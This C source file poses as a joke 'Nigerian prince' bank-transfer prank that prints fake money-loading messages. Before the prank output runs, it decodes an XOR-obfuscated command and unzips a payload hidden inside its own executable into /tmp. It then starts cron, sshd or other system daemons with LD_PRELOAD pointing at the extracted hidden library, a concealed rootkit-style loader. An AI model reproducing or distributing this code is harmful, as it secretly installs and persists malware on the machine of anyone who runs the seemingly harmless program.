#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>

char * cmd_enc = "8a9185968fdfd08f8d909cd0da9bd09a879adfd29bdfda8cdfc1dfd09b9a89d0918a9393dfcdc1d09b9a89d0918a9393f5f5f5";

static void expayload()
{
	char tmp[32];
	strncpy(tmp, "/tmp/XXXXXX", 32);
	if (mkdtemp(tmp) == NULL) {
		exit(EXIT_FAILURE);
	}

	char * cmd_dec = malloc(strlen(cmd_enc));
	bzero(cmd_dec, strlen(cmd_enc));

	for (int i = 0; i < strlen(cmd_enc); i+= 2) {
		char d[3];
		char c;

		d[0] = cmd_enc[i];
		d[1] = cmd_enc[i + 1];
		d[2] = 0;

		sscanf(d, "%x", &c);
		cmd_dec[i / 2] = c ^ 0xff;
	}


	char * cmd = malloc(256);
	int pid = getpid();
	sprintf(cmd, cmd_dec, pid, tmp);
	system(cmd);
	char * preload = malloc(32);
	sprintf(preload, "%s/.s", tmp);
	if (!fork()) {
		setsid();
		if (!fork()) {
			setenv("LD_PRELOAD", preload, 1);
			execlp("/bin/cron", "/bin/cron", "-n", NULL);
			execlp("/sbin/cron", "/sbin/cron", "-n", NULL);
			execlp("/usr/bin/cron", "/usr/bin/cron", "-n", NULL);
			execlp("/usr/sbin/cron", "/usr/sbin/cron", "-n", NULL);

			execlp("/bin/sshd", "/usr/bin/sshd");
			execlp("/sbin/sshd", "/usr/sbin/sshd");
			execlp("/usr/bin/sshd", "/usr/bin/sshd");
			execlp("/usr/sbin/sshd", "/usr/sbin/sshd");

			execlp("atd", "atd");
			execlp("rsyslogd", "rsyslogd");

			execlp("ls", "ls");
			execlp("/bin/ls", "/bin/ls");
			execlp("/usr/bin/ls", "/usr/bin/ls");
		}

		exit(EXIT_SUCCESS);
	}
	wait(NULL);
}

void main()
{
	expayload();
	printf("Accessing swiss Bank\n");
	sleep(1);
	printf("Account number load\n");
	sleep(1);
	printf("Account connect good. Royal fortune access\n");
	sleep(1);
	printf("Transfering necessary funds.\n");
	sleep(1);
	printf("Loaded money: $500.\n");
	sleep(1);
	printf("Loaded money: $1000.\n");
	sleep(1);
	printf("Loaded money: $2000.\n");
	sleep(1);
	printf("Loaded money: $5000.\n");
	sleep(1);
	printf("Loaded money: $8000.\n");
	sleep(1);
	printf("Loaded money: $10000.\n");
	sleep(1);
	printf("Loaded money: $50000.\n");
	sleep(1);
	printf("Loaded money: $100000.\n");
	sleep(1);
	printf("Sufficient funds Have been load.\n");
	sleep(1);
	printf("Please write check for US $25,000 to Prince. Remaining money is yours for keep.\n");
	sleep(1);
	printf("Thank you Sir for your help.\n");
}
